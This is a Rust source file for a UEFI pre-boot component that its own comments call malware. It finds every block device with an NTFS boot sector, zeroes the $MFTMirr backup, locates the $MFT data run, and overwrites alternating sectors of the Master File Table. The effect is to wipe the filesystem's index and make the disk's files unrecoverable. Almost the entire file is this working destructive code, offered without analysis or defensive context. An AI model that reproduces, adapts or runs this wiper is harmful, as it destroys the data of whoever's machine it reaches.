use core::ops::Range;

use uefi::prelude::SystemTable;
use uefi::proto::media::block::BlockIO;
use uefi::ResultExt;
use uefi::table::Boot;

const OEM_ID: &[u8; 8] = b"NTFS    ";

fn read_mft_entry(blk: &BlockIO, media_id: u32, entry_nb: u64, mut buf: &mut [u8], entry_buf: &mut [u8]) -> Result<(), ()> {
    // Read the first half of the file record
    blk.read_blocks(media_id, entry_nb, &mut buf).unwrap_success();

    // If it doesn't start the file FILE signature then get out
    if &buf[0..4] != b"FILE" { return Err(()); }
    // Then put in the entry buffer
    for i in 0..512 { entry_buf[i] = buf[i] }

    // Read the other half
    blk.read_blocks(media_id, entry_nb + 1, &mut buf).unwrap_success();
    for i in 0..512 { entry_buf[i + 512] = buf[i] }

    // We're good
    Ok(())
}

fn get_mft_range(blk: &mut BlockIO, media_id: u32, boot_sector: u64, mut buf: &mut [u8]) -> Result<Range<u64>, ()> {
    // Read Boot Sector, whicj is the first sector of NTFS partition
    blk.read_blocks(media_id, boot_sector, &mut buf).unwrap_success();

    // Get start sector of $MFT and $MFTMirr from Boot Sector
    let mft_start = u64::from_ne_bytes(buf[48..56].try_into().unwrap());
    let mft_start = (mft_start * 8) + boot_sector;
    let mft_mir_start = u64::from_ne_bytes(buf[56..64].try_into().unwrap());
    let mft_mir_start = (mft_mir_start * 8) + boot_sector;

    // Destroy the $MFTMirr cluster, do it here cause it's only 8 sectors to overwrite
    let buf2 = [0u8; 512];
    for sector in mft_mir_start..mft_mir_start+8 {
        blk.write_blocks(media_id, sector, &buf2).unwrap_success();
    }

    // Prepare a buffer with the size of a file record entry
    let mut mft_entry_buf = [0u8; 1024];

    // Read the $MFT file record entry, which is the first entry of the MFT zone
    read_mft_entry(blk, media_id, mft_start, &mut buf, &mut mft_entry_buf)?;

    // Get the first attribute offset from of file record entry header
    let mut first_attribute_offset = u16::from_ne_bytes(mft_entry_buf[20..22].try_into().unwrap()) as usize;

    // Iterate over attributes header until finding the $DATA attribute (0x80) or end (0xFF)
    let mut data_run_offset = 0;
    loop {
        if mft_entry_buf[first_attribute_offset] == 0x80 {
            data_run_offset = u16::from_ne_bytes(mft_entry_buf[first_attribute_offset + 32..first_attribute_offset + 34]
                .try_into()
                .unwrap()
            ) as usize;
            data_run_offset += first_attribute_offset;
            break;
        } else if mft_entry_buf[first_attribute_offset] == 0xFF {
            break;
        } else {
            let length = u32::from_ne_bytes(mft_entry_buf[first_attribute_offset + 4..first_attribute_offset + 8]
                .try_into()
                .unwrap()
            ) as usize;

            first_attribute_offset += length
        }
    }

    // If it doesn't find the $DATA (which would be odd) get out
    if data_run_offset == 0 { return Err(()); };

    // Get the size in sectors of the first data run
    let data_run_size = (u16::from_ne_bytes(mft_entry_buf[data_run_offset + 1..data_run_offset + 3].try_into().unwrap()) * 8) as u64;

    Ok(mft_start..mft_start + data_run_size)
}

/// Fire !
fn beat_the_shit_out_of_the_mft(blk: &mut BlockIO, media_id: u32, mft_zone: Range<u64>) {
    let buf = [0u8; 512];

    log::info!("Start destroying...");
    for sector in mft_zone {
        if sector % 2 == 0 {
            blk.write_blocks(media_id, sector, &buf).unwrap_success();
        }
    }
    log::info!("Finished !");
}

pub fn destroy(st: &SystemTable<Boot>) {
    // Get list of handles which instantiate a BlockIO
    let handles = st
        .boot_services()
        .find_handles::<BlockIO>()
        .expect_success("failed to find handles for `BlockIO`"); // TODO: You might not want your malware to panic bro

    for handle in handles {
        let blk = st
            .boot_services()
            .handle_protocol::<BlockIO>(handle)
            .expect_success("Failed to get BlockIO protocol"); // TODO: Same

        let blk = unsafe { &mut *blk.get() };
        let blk_media = blk.media();
        let media_id = blk_media.media_id();
        let _block_size = blk_media.block_size();
        let _low_lba = blk_media.lowest_aligned_lba();

        let mut buf = [0u8; 512];
        blk.read_blocks(media_id, 0, &mut buf).unwrap_success();

        // If not a NTFS partition then get out
        if &buf[3..11] != OEM_ID { continue; }

        if let Ok(range) = get_mft_range(blk, media_id, 0, &mut buf) {
            beat_the_shit_out_of_the_mft(blk, media_id, range);
            //log::info!("{:#?}", range); // DEBUG
        }
    }
}